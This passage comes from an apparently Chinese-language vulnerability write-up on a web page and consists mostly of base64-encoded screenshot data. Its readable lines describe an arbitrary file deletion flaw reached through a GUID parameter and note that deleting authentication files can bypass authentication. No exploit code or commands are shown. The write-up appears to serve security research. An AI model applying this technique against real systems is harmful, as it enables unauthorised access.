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" alt="img">img</a></h3><p>能将传入的guid传入的文件删除</p>
<h1 id="身份绕过"><a href="#身份绕过" class="headerlink" title="身份绕过"></a>身份绕过</h1><p>删文件某些时候可以删除一些认证的文件，进行文件的绕过</p>
<p><a href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAYYAAABPCAYAAADvEGItAAAMpklEQVR4Ae2cP2scSROH75NspkypwHDgyInAgaNNdNiOFFzoyDjwgZUKgzODdRgFDgyX+PQRDl6wA0VCX6dfpv9Nd03Nn56Z1cyunkBIu9vTXV31TP2qu2f122azMfzgg31g4OTkxHz+/Nm8f/8eZndw3378+NF8//49/nz79s2cnZ3h6x34uuR+e/bsmbm+vo5xqWJU3QfV/VDST0nb30oa0xYBgQEYgIHDZwBhWLga4CY7/JuMGBPjfWMAYUAYdrYc3bebAXtJ4DDgGEAYEAaEAQZgAAYyBhAGgMiAoGKiaoYBGEAYEAaEAQZgAAYyBhAGgMiAoFqkWoQBGEAYEAaEAQZgAAYyBnYvDC9uzPbq3v28u8gGL6pMnlyb06t78/QFal7kN4Afzxy+w3ePlIHdC0N07IV5agXilzl5MiK5IwzcpJGlEfxwLfzAwGAGHlAYqpvZi8PltTkqDRLCMDiorCgQ